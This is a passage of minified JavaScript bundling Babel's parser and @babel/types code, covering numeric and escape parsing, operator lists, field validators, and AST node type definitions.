if(Number.isNaN(b)||!q(b)||Z.has(T)||Z.has(b)){if(V)return{n:null,pos:J};$.unexpectedNumericSeparator(J,Q,Y)}++J;continue}if(I>=97)F=I-97+10;else if(I>=65)F=I-65+10;else if(lu(I))F=I-48;else F=1/0;if(F>=W)if(F<=9&&V)return{n:null,pos:J};else if(F<=9&&$.invalidDigit(J,Q,Y,W))F=0;else if(H)F=0,B=!0;else break;++J,M=M*W+F}if(J===K||G!=null&&J-K!==G||B)return{n:null,pos:J};return{n:M,pos:J}}function UK(X,J,Q,Y,W,G){let H=X.charCodeAt(J),z;if(H===123){if(++J,{code:z,pos:J}=JY(X,J,Q,Y,X.indexOf("}",J)-J,!0,W,G),++J,z!==null&&z>1114111)if(W)G.invalidCodePoint(J,Q,Y);else return{code:null,pos:J}}else({code:z,pos:J}=JY(X,J,Q,Y,4,!1,W,G));return{code:z,pos:J}}});var l8=v((MK)=>{Object.defineProperty(MK,"__esModule",{value:!0});MK.UPDATE_OPERATORS=MK.UNARY_OPERATORS=MK.STRING_UNARY_OPERATORS=MK.STATEMENT_OR_BLOCK_KEYS=MK.NUMBER_UNARY_OPERATORS=MK.NUMBER_BINARY_OPERATORS=MK.LOGICAL_OPERATORS=MK.INHERIT_KEYS=MK.FOR_INIT_KEYS=MK.FLATTENABLE_KEYS=MK.EQUALITY_BINARY_OPERATORS=MK.COMPARISON_BINARY_OPERATORS=MK.COMMENT_KEYS=MK.BOOLEAN_UNARY_OPERATORS=MK.BOOLEAN_NUMBER_BINARY_OPERATORS=MK.BOOLEAN_BINARY_OPERATORS=MK.BINARY_OPERATORS=MK.ASSIGNMENT_OPERATORS=void 0;var Lm1=MK.STATEMENT_OR_BLOCK_KEYS=["consequent","body","alternate"],Im1=MK.FLATTENABLE_KEYS=["body","expressions"],Cm1=MK.FOR_INIT_KEYS=["left","init"],Pm1=MK.COMMENT_KEYS=["leadingComments","trailingComments","innerComments"],su=MK.LOGICAL_OPERATORS=["||","&&","??"],Sm1=MK.UPDATE_OPERATORS=["++","--"],ou=MK.BOOLEAN_NUMBER_BINARY_OPERATORS=[">","<",">=","<="],tu=MK.EQUALITY_BINARY_OPERATORS=["==","===","!=","!=="],eu=MK.COMPARISON_BINARY_OPERATORS=[...tu,"in","instanceof"],Xc=MK.BOOLEAN_BINARY_OPERATORS=[...eu,...ou],BK=MK.NUMBER_BINARY_OPERATORS=["-","/","%","*","**","&","|",">>",">>>","<<","^"],Tm1=MK.BINARY_OPERATORS=["+",...BK,...Xc,"|>"],_m1=MK.ASSIGNMENT_OPERATORS=["=","+=",...BK.map((X)=>X+"="),...su.map((X)=>X+"=")],Jc=MK.BOOLEAN_UNARY_OPERATORS=["delete","!"],Qc=MK.NUMBER_UNARY_OPERATORS=["+","-","~"],Yc=MK.STRING_UNARY_OPERATORS=["typeof"],Em1=MK.UNARY_OPERATORS=["void","throw",...Jc,...Qc,...Yc],km1=MK.INHERIT_KEYS={optional:["typeAnnotation","typeParameters","returnType"],force:["start","loc","end"]};MK.BLOCK_SCOPED_SYMBOL=Symbol.for("var used to be block scoped"),MK.NOT_LOCAL_BINDING=Symbol.for("should not be considered a local binding")});var z6=v((NK)=>{Object.defineProperty(NK,"__esModule",{value:!0});NK.allExpandedTypes=NK.VISITOR_KEYS=NK.NODE_PARENT_VALIDATIONS=NK.NODE_FIELDS=NK.FLIPPED_ALIAS_KEYS=NK.DEPRECATED_KEYS=NK.BUILDER_KEYS=NK.ALIAS_KEYS=void 0;NK.arrayOf=FK;NK.arrayOfType=RK;NK.assertEach=AK;NK.assertNodeOrValueType=bc;NK.assertNodeType=r5;NK.assertOneOf=Ec;NK.assertOptionalChainStart=fc;NK.assertShape=vc;NK.assertValueType=GY;NK.chain=DK;NK.default=wK;NK.defineAliasedType=yc;NK.validate=WY;NK.validateArrayOfType=_c;NK.validateOptional=Sc;NK.validateOptionalType=Tc;NK.validateType=Pc;var OK=u8(),eJ=a5(),Dc=NK.VISITOR_KEYS={},wc=NK.ALIAS_KEYS={},QY=NK.FLIPPED_ALIAS_KEYS={},Nc=NK.NODE_FIELDS={},Lc=NK.BUILDER_KEYS={},Ic=NK.DEPRECATED_KEYS={},Cc=NK.NODE_PARENT_VALIDATIONS={};function i5(X){if(Array.isArray(X))return"array";else if(X===null)return"null";else return typeof X}function WY(X){return{validate:X}}function Pc(...X){return WY(r5(...X))}function Sc(X){return{validate:X,optional:!0}}function Tc(...X){return{validate:r5(...X),optional:!0}}function FK(X){return DK(GY("array"),AK(X))}function RK(...X){return FK(r5(...X))}function _c(...X){return WY(RK(...X))}function AK(X){let J=process.env.BABEL_TYPES_8_BREAKING?eJ.validateChild:()=>{};function Q(Y,W,G){if(!Array.isArray(G))return;let H=0,z={toString(){return`${W}[${H}]`}};for(;H<G.length;H++){let $=G[H];X(Y,z,$),J(Y,z,$)}}return Q.each=X,Q}function Ec(...X){function J(Q,Y,W){if(!X.includes(W))throw TypeError(`Property ${Y} expected value to be one of ${JSON.stringify(X)} but got ${JSON.stringify(W)}`)}return J.oneOf=X,J}var kc=NK.allExpandedTypes=[];function r5(...X){let J=new Set;kc.push({types:X,set:J});function Q(Y,W,G){let H=G==null?void 0:G.type;if(H!=null){if(J.has(H)){(0,eJ.validateChild)(Y,W,G);return}if(H==="Placeholder"){for(let z of X)if((0,OK.default)(z,G)){(0,eJ.validateChild)(Y,W,G);return}}}throw TypeError(`Property ${W} of ${Y.type} expected node to be of a type ${JSON.stringify(X)} but instead got ${JSON.stringify(H)}`)}return Q.oneOfNodeTypes=X,Q}function bc(...X){function J(Q,Y,W){let G=i5(W);for(let H of X)if(G===H||(0,OK.default)(H,W)){(0,eJ.validateChild)(Q,Y,W);return}throw TypeError(`Property ${Y} of ${Q.type} expected node to be of a type ${JSON.stringify(X)} but instead got ${JSON.stringify(W==null?void 0:W.type)}`)}return J.oneOfNodeOrValueTypes=X,J}function GY(X){function J(Q,Y,W){if(i5(W)===X)return;throw TypeError(`Property ${Y} expected type of ${X} but got ${i5(W)}`)}return J.type=X,J}function vc(X){let J=Object.keys(X);function Q(Y,W,G){let H=[];for(let z of J)try{(0,eJ.validateField)(Y,z,G[z],X[z])}catch($){if($ instanceof TypeError){H.push($.message);continue}throw $}if(H.length)throw TypeError(`Property ${W} of ${Y.type} expected to have the following:
${H.join(`
`)}`)}return Q.shapeOf=X,Q}function fc(){function X(J){var Q;let Y=J;while(J){let{type:W}=Y;if(W==="OptionalCallExpression"){if(Y.optional)return;Y=Y.callee;continue}if(W==="OptionalMemberExpression"){if(Y.optional)return;Y=Y.object;continue}break}throw TypeError(`Non-optional ${J.type} must chain from an optional OptionalMemberExpression or OptionalCallExpression. Found chain from ${(Q=Y)==null?void 0:Q.type}`)}return X}function DK(...X){function J(...Q){for(let Y of X)Y(...Q)}if(J.chainOf=X,X.length>=2&&"type"in X[0]&&X[0].type==="array"&&!("each"in X[1]))throw Error('An assertValueType("array") validator can only be followed by an assertEach(...) validator.');return J}var xc=new Set(["aliases","builder","deprecatedAlias","fields","inherits","visitor","validate"]),hc=new Set(["default","optional","deprecated","validate"]),YY={};function yc(...X){return(J,Q={})=>{let Y=Q.aliases;if(!Y){var W;if(Q.inherits)Y=(W=YY[Q.inherits].aliases)==null?void 0:W.slice();Y!=null||(Y=[]),Q.aliases=Y}let G=X.filter((H)=>!Y.includes(H));Y.unshift(...G),wK(J,Q)}}function wK(X,J={}){let Q=J.inherits&&YY[J.inherits]||{},Y=J.fields;if(!Y){if(Y={},Q.fields){let z=Object.getOwnPropertyNames(Q.fields);for(let $ of z){let V=Q.fields[$],K=V.default;if(Array.isArray(K)?K.length>0:K&&typeof K==="object")throw Error("field defaults can only be primitives or empty arrays currently");Y[$]={default:Array.isArray(K)?[]:K,optional:V.optional,deprecated:V.deprecated,validate:V.validate}}}}let W=J.visitor||Q.visitor||[],G=J.aliases||Q.aliases||[],H=J.builder||Q.builder||J.visitor||[];for(let z of Object.keys(J))if(!xc.has(z))throw Error(`Unknown type option "${z}" on ${X}`);if(J.deprecatedAlias)Ic[J.deprecatedAlias]=X;for(let z of W.concat(H))Y[z]=Y[z]||{};for(let z of Object.keys(Y)){let $=Y[z];if($.default!==void 0&&!H.includes(z))$.optional=!0;if($.default===void 0)$.default=null;else if(!$.validate&&$.default!=null)$.validate=GY(i5($.default));for(let V of Object.keys($))if(!hc.has(V))throw Error(`Unknown field key "${V}" on ${X}.${z}`)}if(Dc[X]=J.visitor=W,Lc[X]=J.builder=H,Nc[X]=J.fields=Y,wc[X]=J.aliases=G,G.forEach((z)=>{QY[z]=QY[z]||[],QY[z].push(X)}),J.validate)Cc[X]=J.validate;YY[X]=J}});var X7=v((PK)=>{Object.defineProperty(PK,"__esModule",{value:!0});PK.patternLikeCommon=PK.importAttributes=PK.functionTypeAnnotationCommon=PK.functionDeclarationCommon=PK.functionCommon=PK.classMethodOrPropertyCommon=PK.classMethodOrDeclareMethodCommon=void 0;var n0=u8(),Vl=c8(),IK=tJ(),Kl=qK(),p8=l8(),w=z6(),e=(0,w.defineAliasedType)("Standardized");e("ArrayExpression",{fields:{elements:{validate:(0,w.arrayOf)((0,w.assertNodeOrValueType)("null","Expression","SpreadElement")),default:!process.env.BABEL_TYPES_8_BREAKING?[]:void 0}},visitor:["elements"],aliases:["Expression"]});e("AssignmentExpression",{fields:{operator:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,w.assertValueType)("string"):Object.assign(function(){let X=(0,w.assertOneOf)(...p8.ASSIGNMENT_OPERATORS),J=(0,w.assertOneOf)("=");return function(Q,Y,W){((0,n0.default)("Pattern",Q.left)?J:X)(Q,Y,W)}}(),{oneOf:p8.ASSIGNMENT_OPERATORS})},left:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,w.assertNodeType)("LVal","OptionalMemberExpression"):(0,w.assertNodeType)("Identifier","MemberExpression","OptionalMemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")},right:{validate:(0,w.assertNodeType)("Expression")}},builder:["operator","left","right"],visitor:["left","right"],aliases:["Expression"]});e("BinaryExpression",{builder:["operator","left","right"],fields:{operator:{validate:(0,w.assertOneOf)(...p8.BINARY_OPERATORS)},left:{validate:function(){let X=(0,w.assertNodeType)("Expression"),J=(0,w.assertNodeType)("Expression","PrivateName");return Object.assign(function(Y,W,G){(Y.operator==="in"?J:X)(Y,W,G)},{oneOfNodeTypes:["Expression","PrivateName"]})}()},right:{validate:(0,w.assertNodeType)("Expression")}},visitor:["left","right"],aliases:["Binary","Expression"]});e("InterpreterDirective",{builder:["value"],fields:{value:{validate:(0,w.assertValueType)("string")}}});e("Directive",{visitor:["value"],fields:{value:{validate:(0,w.assertNodeType)("DirectiveLiteral")}}});e("DirectiveLiteral",{builder:["value"],fields:{value:{validate:(0,w.assertValueType)("string")}}});e("BlockStatement",{builder:["body","directives"],visitor:["directives","body"],fields:{directives:{validate:(0,w.arrayOfType)("Directive"),default:[]},body:(0,w.validateArrayOfType)("Statement")},aliases:["Scopable","BlockParent","Block","Statement"]});e("BreakStatement",{visitor:["label"],fields:{label:{validate:(0,w.assertNodeType)("Identifier"),optional:!0}},aliases:["Statement","Terminatorless","CompletionStatement"]});e("CallExpression",{visitor:["callee","typeParameters","typeArguments","arguments"],builder:["callee","arguments"],aliases:["Expression"],fields:Object.assign({callee:{validate:(0,w.assertNodeType)("Expression","Super","V8IntrinsicIdentifier")},arguments:(0,w.validateArrayOfType)("Expression","SpreadElement","ArgumentPlaceholder"),typeArguments:{validate:(0,w.assertNodeType)("TypeParameterInstantiation"),optional:!0}},process.env.BABEL_TYPES_8_BREAKING?{}:{optional:{validate:(0,w.assertValueType)("boolean"),optional:!0},typeParameters:{validate:(0,w.assertNodeType)("TSTypeParameterInstantiation"),optional:!0}})});e("CatchClause",{visitor:["param","body"],fields:{param:{validate:(0,w.assertNodeType)("Identifier","ArrayPattern","ObjectPattern"),optional:!0},body:{validate:(0,w.assertNodeType)("BlockStatement")}},aliases:["Scopable","BlockParent"]});e("ConditionalExpression",{visitor:["test","consequent","alternate"],fields:{test:{validate:(0,w.assertNodeType)("Expression")},consequent:{validate:(0,w.assertNodeType)("Expression")},alternate:{validate:(0,w.assertNodeType)("Expression")}},aliases:["Expression","Conditional"]});e("ContinueStatement",{visitor:["label"],fields:{label:{validate:(0,w.assertNodeType)("Identifier"),optional:!0}},aliases:["Statement","Terminatorless","CompletionStatement"]});e("DebuggerStatement",{aliases:["Statement"]});e("DoWhileStatement",{builder:["test","body"],visitor:["body","test"],fields:{test:{validate:(0,w.assertNodeType)("Expression")},body:{validate:(0,w.assertNodeType)("Statement")}},aliases:["Statement","BlockParent","Loop","While","Scopable"]});e("EmptyStatement",{aliases:["Statement"]});e("ExpressionStatement",{visitor:["expression"],fields:{expression:{validate:(0,w.assertNodeType)("Expression")}},aliases:["Statement","ExpressionWrapper"]});e("File",{builder:["program","comments","tokens"],visitor:["program"],fields:{program:{validate:(0,w.assertNodeType)("Program")},comments:{validate:!process.env.BABEL_TYPES_8_BREAKING?Object.assign(()=>{},{each:{oneOfNodeTypes:["CommentBlock","CommentLine"]}}):(0,w.assertEach)((0,w.assertNodeType)("CommentBlock","CommentLine")),optional:!0},tokens:{validate:(0,w.assertEach)(Object.assign(()=>{},{type:"any"})),optional:!0}}});e("ForInStatement",{visitor:["left","right","body"],aliases:["Scopable","Statement","For","BlockParent","Loop","ForXStatement"],fields:{left:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,w.assertNodeType)("VariableDeclaration","LVal"):(0,w.assertNodeType)("VariableDeclaration","Identifier","MemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")},right:{validate:(0,w.assertNodeType)("Expression")},body:{validate:(0,w.assertNodeType)("Statement")}}});e("ForStatement",{visitor:["init","test","update","body"],aliases:["Scopable","Statement","For","BlockParent","Loop"],fields:{init:{validate:(0,w.assertNodeType)("VariableDeclaration","Expression"),optional:!0},test:{validate:(0,w.assertNodeType)("Expression"),optional:!0},update:{validate:(0,w.assertNodeType)("Expression"),optional:!0},body:{validate:(0,w.assertNodeType)("Statement")}}});var d8=()=>({params:(0,w.validateArrayOfType)("FunctionParameter"),generator:{default:!1},async:{default:!1}});PK.functionCommon=d8;var vX=()=>({returnType:{validate:(0,w.assertNodeType)("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},typeParameters:{validate:(0,w.assertNodeType)("TypeParameterDeclaration","TSTypeParameterDeclaration","Noop"),optional:!0}});PK.functionTypeAnnotationCommon=vX;var CK=()=>Object.assign({},d8(),{declare:{validate:(0,w.assertValueType)("boolean"),optional:!0},id:{validate:(0,w.assertNodeType)("Identifier"),optional:!0}});PK.functionDeclarationCommon=CK;e("FunctionDeclaration",{builder:["id","params","body","generator","async"],visitor:["id","typeParameters","params","predicate","returnType","body"],fields:Object.assign({},CK(),vX(),{body:{validate:(0,w.assertNodeType)("BlockStatement")},predicate:{validate:(0,w.assertNodeType)("DeclaredPredicate","InferredPredicate"),optional:!0}}),aliases:["Scopable","Function","BlockParent","FunctionParent","Statement","Pureish","Declaration"],validate:!process.env.BABEL_TYPES_8_BREAKING?void 0:function(){let X=(0,w.assertNodeType)("Identifier");return function(J,Q,Y){if(!(0,n0.default)("ExportDefaultDeclaration",J))X(Y,"id",Y.id)}}()});e("FunctionExpression",{inherits:"FunctionDeclaration",aliases:["Scopable","Function","BlockParent","FunctionParent","Expression","Pureish"],fields:Object.assign({},d8(),vX(),{id:{validate:(0,w.assertNodeType)("Identifier"),optional:!0},body:{validate:(0,w.assertNodeType)("BlockStatement")},predicate:{validate:(0,w.assertNodeType)("DeclaredPredicate","InferredPredicate"),optional:!0}})});var i8=()=>({typeAnnotation:{validate:(0,w.assertNodeType)("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},optional:{validate:(0,w.assertValueType)("boolean"),optional:!0},decorators:{validate:(0,w.arrayOfType)("Decorator"),optional:!0}});PK.patternLikeCommon=i8;e("Identifier",{builder:["name"],visitor:["typeAnnotation","decorators"],aliases:["Expression","FunctionParameter","PatternLike","LVal","TSEntityName"],fields:Object.assign({},i8(),{name:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,w.chain)((0,w.assertValueType)("string"),Object.assign(function(X,J,Q){if(!(0,Vl.default)(Q,!1))throw TypeError(`"${Q}" is not a valid identifier name`)},{type:"string"})):(0,w.assertValueType)("string")}}),validate:process.env.BABEL_TYPES_8_BREAKING?function(X,J,Q){let Y=/\.(\w+)$/.exec(J.toString());if(!Y)return;let[,W]=Y,G={computed:!1};if(W==="property"){if((0,n0.default)("MemberExpression",X,G))return;if((0,n0.default)("OptionalMemberExpression",X,G))return}else if(W==="key"){if((0,n0.default)("Property",X,G))return;if((0,n0.default)("Method",X,G))return}else if(W==="exported"){if((0,n0.default)("ExportSpecifier",X))return}else if(W==="imported"){if((0,n0.default)("ImportSpecifier",X,{imported:Q}))return}else if(W==="meta"){if((0,n0.default)("MetaProperty",X,{meta:Q}))return}if(((0,IK.isKeyword)(Q.name)||(0,IK.isReservedWord)(Q.name,!1))&&Q.name!=="this")throw TypeError(`"${Q.name}" is not a valid identifier`)}:void 0});e("IfStatement",{visitor:["test","consequent","alternate"],aliases:["Statement","Conditional"],fields:{test:{validate:(0,w.assertNodeType)("Expression")},consequent:{validate:(0,w.assertNodeType)("Statement")},alternate:{optional:!0,validate:(0,w.assertNodeType)("Statement")}}});e("LabeledStatement",{visitor:["label","body"],aliases:["Statement"],fields:{label:{validate:(0,w.assertNodeType)("Identifier")},body:{validate:(0,w.assertNodeType)("Statement")}}});e("StringLiteral",{builder:["value"],fields:{value:{validate:(0,w.assertValueType)("string")}},aliases:["Expression","Pureish","Literal","Immutable"]});e("NumericLiteral",{builder:["value"],deprecatedAlias:"NumberLiteral",fields:{value:{validate:(0,w.chain)((0,w.assertValueType)("number"),Object.assign(function(X,J,Q){if(1/Q<0||!Number.isFinite(Q)){let Y=Error(`NumericLiterals must be non-negative finite numbers. You can use t.valueToNode(${Q}) instead.`)}},{type:"number"}))}},aliases:["Expression","Pureish","Literal","Immutable"]});e("NullLiteral",{aliases:["Expression","Pureish","Literal","Immutable"]});e("BooleanLiteral",{builder:["value"],fields:{value:{validate:(0,w.assertValueType)("boolean")}},aliases:["Expression","Pureish","Literal","Immutable"]});e("RegExpLiteral",{builder:["pattern","flags"],deprecatedAlias:"RegexLiteral",aliases:["Expression","Pureish","Literal"],fields:{pattern:{validate:(0,w.assertValueType)("string")},flags:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,w.chain)((0,w.assertValueType)("string"),Object.assign(function(X,J,Q){let Y=/[^gimsuy]/.exec(Q);if(Y)throw TypeError(`"${Y[0]}" is not a valid RegExp flag`)},{type:"string"})):(0,w.assertValueType)("string"),default:""}}});e("LogicalExpression",{builder:["operator","left","right"],visitor:["left","right"],aliases:["Binary","Expression"],fields:{operator:{validate:(0,w.assertOneOf)(...p8.LOGICAL_OPERATORS)},left:{validate:(0,w.assertNodeType)("Expression")},right:{validate:(0,w.assertNodeType)("Expression")}}});e("MemberExpression",{builder:["object","property","computed",...!process.env.BABEL_TYPES_8_BREAKING?["optional"]:[]],visitor:["object","property"],aliases:["Expression","LVal","PatternLike"],fields:Object.assign({object:{validate:(0,w.assertNodeType)("Expression","Super")},property:{validate:function(){let X=(0,w.assertNodeType)("Identifier","PrivateName"),J=(0,w.assertNodeType)("Expression"),Q=function(Y,W,G){(Y.computed?J:X)(Y,W,G)};return Q.oneOfNodeTypes=["Expression","Identifier","PrivateName"],Q}()},computed:{default:!1}},!process.env.BABEL_TYPES_8_BREAKING?{optional:{validate:(0,w.assertValueType)("boolean"),optional:!0}}:{})});e("NewExpression",{inherits:"CallExpression"});e("Program",{visitor:["directives","body"],builder:["body","directives","sourceType","interpreter"],fields:{sourceType:{validate:(0,w.assertOneOf)("script","module"),default:"script"},interpreter:{validate:(0,w.assertNodeType)("InterpreterDirective"),default:null,optional:!0},directives:{validate:(0,w.arrayOfType)("Directive"),default:[]},body:(0,w.validateArrayOfType)("Statement")},aliases:["Scopable","BlockParent","Block"]});e("ObjectExpression",{visitor:["properties"],aliases:["Expression"],fields:{properties:(0,w.validateArrayOfType)("ObjectMethod","ObjectProperty","SpreadElement")}});e("ObjectMethod",{builder:["kind","key","params","body","computed","generator","async"],visitor:["decorators","key","typeParameters","params","returnType","body"],fields:Object.assign({},d8(),vX(),{kind:Object.assign({validate:(0,w.assertOneOf)("method","get","set")},!process.env.BABEL_TYPES_8_BREAKING?{default:"method"}:{}),computed:{default:!1},key:{validate:function(){let X=(0,w.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral"),J=(0,w.assertNodeType)("Expression"),Q=function(Y,W,G){(Y.computed?J:X)(Y,W,G)};return Q.oneOfNodeTypes=["Expression","Identifier","StringLiteral","NumericLiteral","BigIntLiteral"],Q}()},decorators:{validate:(0,w.arrayOfType)("Decorator"),optional:!0},body:{validate:(0,w.assertNodeType)("BlockStatement")}}),aliases:["UserWhitespacable","Function","Scopable","BlockParent","FunctionParent","Method","ObjectMember"]});e("ObjectProperty",{builder:["key","value","computed","shorthand",...!process.env.BABEL_TYPES_8_BREAKING?["decorators"]:[]],fields:{computed:{default:!1},key:{validate:function(){let X=(0,w.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","DecimalLiteral","PrivateName"),J=(0,w.assertNodeType)("Expression");return Object.assign(function(Y,W,G){(Y.computed?J:X)(Y,W,G)},{oneOfNodeTypes:["Expression","Identifier","StringLiteral","NumericLiteral","BigIntLiteral","DecimalLiteral","PrivateName"]})}()},value:{validate:(0,w.assertNodeType)("Expression","PatternLike")},shorthand:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,w.chain)((0,w.assertValueType)("boolean"),Object.assign(function(X,J,Q){if(!Q)return;if(X.computed)throw TypeError("Property shorthand of ObjectProperty cannot be true if computed is true");if(!(0,n0.default)("Identifier",X.key))throw TypeError("Property shorthand of ObjectProperty cannot be true if key is not an Identifier")},{type:"boolean"})):(0,w.assertValueType)("boolean"),default:!1},decorators:{validate:(0,w.arrayOfType)("Decorator"),optional:!0}},visitor:["decorators","key","value"],aliases:["UserWhitespacable","Property","ObjectMember"],validate:!process.env.BABEL_TYPES_8_BREAKING?void 0:function(){let X=(0,w.assertNodeType)("Identifier","Pattern","TSAsExpression","TSSatisfiesExpression","TSNonNullExpression","TSTypeAssertion"),J=(0,w.assertNodeType)("Expression");return function(Q,Y,W){((0,n0.default)("ObjectPattern",Q)?X:J)(W,"value",W.value)}}()});e("RestElement",{visitor:["argument","typeAnnotation"],builder:["argument"],aliases:["FunctionParameter","PatternLike","LVal"],deprecatedAlias:"RestProperty",fields:Object.assign({},i8(),{argument:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,w.assertNodeType)("Identifier","ArrayPattern","ObjectPattern","MemberExpression","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression","RestElement","AssignmentPattern"):(0,w.assertNodeType)("Identifier","ArrayPattern","ObjectPattern","MemberExpression","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")}}),validate:process.env.BABEL_TYPES_8_BREAKING?function(X,J){let Q=/(\w+)\[(\d+)\]/.exec(J.toString());if(!Q)throw Error("Internal Babel error: malformed key.");let[,Y,W]=Q;if(X[Y].length>+W+1)throw TypeError(`RestElement must be last element of ${Y}`)}:void 0});e("ReturnStatement",{visitor:["argument"],aliases:["Statement","Terminatorless","CompletionStatement"],fields:{argument:{validate:(0,w.assertNodeType)("Expression"),optional:!0}}});e("SequenceExpression",{visitor:["expressions"],fields:{expressions:(0,w.validateArrayOfType)("Expression")},aliases:["Expression"]});e("ParenthesizedExpression",{visitor:["expression"],aliases:["Expression","ExpressionWrapper"],fields:{expression:{validate:(0,w.assertNodeType)("Expression")}}});e("SwitchCase",{visitor:["test","consequent"],fields:{test:{validate:(0,w.assertNodeType)("Expression"),optional:!0},consequent:(0,w.validateArrayOfType)("Statement")}});e("SwitchStatement",{visitor:["discriminant","cases"],aliases:["Statement","BlockParent","Scopable"],fields:{discriminant:{validate:(0,w.assertNodeType)("Expression")},cases:(0,w.validateArrayOfType)("SwitchCase")}});e("ThisExpression",{aliases:["Expression"]});e("ThrowStatement",{visitor:["argument"],aliases:["Statement","Terminatorless","CompletionStatement"],fields:{argument:{validate:(0,w.assertNodeType)("Expression")}}});e("TryStatement",{visitor:["block","handler","finalizer"],aliases:["Statement"],fields:{block:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,w.chain)((0,w.assertNodeType)("BlockStatement"),Object.assign(function(X){if(!X.handler&&!X.finalizer)throw TypeError("TryStatement expects either a handler or finalizer, or both")},{oneOfNodeTypes:["BlockStatement"]})):(0,w.assertNodeType)("BlockStatement")},handler:{optional:!0,validate:(0,w.assertNodeType)("CatchClause")},finalizer:{optional:!0,validate:(0,w.assertNodeType)("BlockStatement")}}});e("UnaryExpression",{builder:["operator","argument","prefix"],fields:{prefix:{default:!0},argument:{validate:(0,w.assertNodeType)("Expression")},operator:{validate:(0,w.assertOneOf)(...p8.UNARY_OPERATORS)}},visitor:["argument"],aliases:["UnaryLike","Expression"]});e("UpdateExpression",{builder:["operator","argument","prefix"],fields:{prefix:{default:!1},argument:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,w.assertNodeType)("Expression"):(0,w.assertNodeType)("Identifier","MemberExpression")},operator:{validate:(0,w.assertOneOf)(...p8.UPDATE_OPERATORS)}},visitor:["argument"],aliases:["Expression"]});e("VariableDeclaration",{builder:["kind","declarations"],visitor:["declarations"],aliases:["Statement","Declaration"],fields:{declare:{validate:(0,w.assertValueType)("boolean"),optional:!0},kind:{validate:(0,w.assertOneOf)("var","let","const","using","await using")},declarations:(0,w.validateArrayOfType)("VariableDeclarator")},validate:process.env.BABEL_TYPES_8_BREAKING?(()=>{let X=(0,w.assertNodeType)("Identifier","Placeholder"),J=(0,w.assertNodeType)("Identifier","ArrayPattern","ObjectPattern","Placeholder"),Q=(0,w.assertNodeType)("Identifier","VoidPattern","Placeholder");return function(Y,W,G){let{kind:H,declarations:z}=G,$=(0,n0.default)("ForXStatement",Y,{left:G});if($){if(z.length!==1)throw TypeError(`Exactly one VariableDeclarator is required in the VariableDeclaration of a ${Y.type}`)}for(let V of z)if(H==="const"||H==="let"||H==="var")if(!$&&!V.init)X(V,"id",V.id);else J(V,"id",V.id);else Q(V,"id",V.id)}})():void 0});e("VariableDeclarator",{visitor:["id","init"],fields:{id:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,w.assertNodeType)("LVal","VoidPattern"):(0,w.assertNodeType)("Identifier","ArrayPattern","ObjectPattern","VoidPattern")},definite:{optional:!0,validate:(0,w.assertValueType)("boolean")},init:{optional:!0,validate:(0,w.assertNodeType)("Expression")}}});e("WhileStatement",{visitor:["test","body"],aliases:["Statement","BlockParent","Loop","While","Scopable"],fields:{test:{validate:(0,w.assertNodeType)("Expression")},body:{validate:(0,w.assertNodeType)("Statement")}}});e("WithStatement",{visitor:["object","body"],aliases:["Statement"],fields:{object:{validate:(0,w.assertNodeType)("Expression")},body:{validate:(0,w.assertNodeType)("Statement")}}});e("AssignmentPattern",{visitor:["left","right","decorators"],builder:["left","right"],aliases:["FunctionParameter","Pattern","PatternLike","LVal"],fields:Object.assign({},i8(),{left:{validate:(0,w.assertNodeType)("Identifier","ObjectPattern","ArrayPattern","MemberExpression","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")},right:{validate:(0,w.assertNodeType)("Expression")},decorators:{validate:(0,w.arrayOfType)("Decorator"),optional:!0}})});e("ArrayPattern",{visitor:["elements","typeAnnotation"],builder:["elements"],aliases:["FunctionParameter","Pattern","PatternLike","LVal"],fields:Object.assign({},i8(),{elements:{validate:(0,w.chain)((0,w.assertValueType)("array"),(0,w.assertEach)((0,w.assertNodeOrValueType)("null","PatternLike")))}})});e("ArrowFunctionExpression",{builder:["params","body","async"],visitor:["typeParameters","params","predicate","returnType","body"],aliases:["Scopable","Function","BlockParent","FunctionParent","Expression","Pureish"],fields:Object.assign({},d8(),vX(),{expression:{validate:(0,w.assertValueType)("boolean")},body:{validate:(0,w.assertNodeType)("BlockStatement","Expression")},predicate:{validate:(0,w.assertNodeType)("DeclaredPredicate","InferredPredicate"),optional:!0}})});e("ClassBody",{visitor:["body"],fields:{body:(0,w.validateArrayOfType)("ClassMethod","ClassPrivateMethod","ClassProperty","ClassPrivateProperty","ClassAccessorProperty","TSDeclareMethod","TSIndexSignature","StaticBlock")}});e("ClassExpression",{builder:["id","superClass","body","decorators"],visitor:["decorators","id","typeParameters","superClass","superTypeParameters","mixins","implements","body"],aliases:["Scopable","Class","Expression"],fields:{id:{validate:(0,w.assertNodeType)("Identifier"),optional:!0},typeParameters:{validate:(0,w.assertNodeType)("TypeParameterDeclaration","TSTypeParameterDeclaration","Noop"),optional:!0},body:{validate:(0,w.assertNodeType)("ClassBody")},superClass:{optional:!0,validate:(0,w.assertNodeType)("Expression")},["superTypeParameters"]:{validate:(0,w.assertNodeType)("TypeParameterInstantiation","TSTypeParameterInstantiation"),optional:!0},implements:{validate:(0,w.arrayOfType)("TSExpressionWithTypeArguments","ClassImplements"),optional:!0},decorators:{validate:(0,w.arrayOfType)("Decorator"),optional:!0},mixins:{validate:(0,w.assertNodeType)("InterfaceExtends"),optional:!0}}});e("ClassDeclaration",{inherits:"ClassExpression",aliases:["Scopable","Class","Statement","Declaration"],fields:{id:{validate:(0,w.assertNodeType)("Identifier"),optional:!0},typeParameters:{validate:(0,w.asser